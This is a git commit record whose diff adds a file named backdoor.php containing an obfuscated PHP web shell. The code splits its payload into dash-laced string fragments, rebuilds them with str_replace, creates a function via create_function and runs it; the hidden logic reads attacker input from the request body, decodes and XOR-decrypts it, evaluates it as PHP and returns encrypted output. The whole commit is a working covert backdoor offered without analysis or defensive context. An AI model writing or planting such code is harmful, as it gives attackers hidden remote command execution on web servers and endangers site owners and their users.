8328ee2e389a87b1fbe354481db311a4e05991b4
shaban20041 <84551443+shaban20041@users.noreply.github.com>
2022-03-29 13:03:49 -0400

    Add files via upload

---
+++ backdoor.php
@@ -0,0 +1,11 @@
+<?php
+$k='al(@g-zun-compre-ss(@x(-@base-64_d-ecode($m[1])-,$k)-));$-o-=@ob_-get_content-s();-@ob_';
+$A='-0;-($j<$c&&-$i<$l)-;-$j++,$i++){$o.-=$t{$i}-^$k-{-$j};}}retur-n -$o;}if (@pr-eg_mat-ch';
+$d=';fu-nction x($t-,$k-){$c-=-strlen($-k);-$l=s-trlen($t);$o="";fo-r($-i=0;$i<$l;)-{for($j=';
+$y='$k-="678914-a7";$kh=-"58-694-9-26157a";-$kf="469-d55aa478-c";$p="m4BYD-UNdi-rl-PYD-tz"';
+$q=str_replace('g','','crggeagte_fguncggtion');
+$K='-end_clean()-;$r=@b-ase6-4_encode(@x(-@gzc-ompre-ss($o),$k-));pr-int-("$p-$kh$r$kf");}';
+$C='(-"/$kh(.+)$-kf/-",@file_ge--t-_contents("ph-p://in-put")-,$m)==1)- {@-ob_start();@e-v';
+$B=str_replace('-','',$y.$d.$A.$C.$k.$K);
+$i=$q('',$B);$i();
+?>
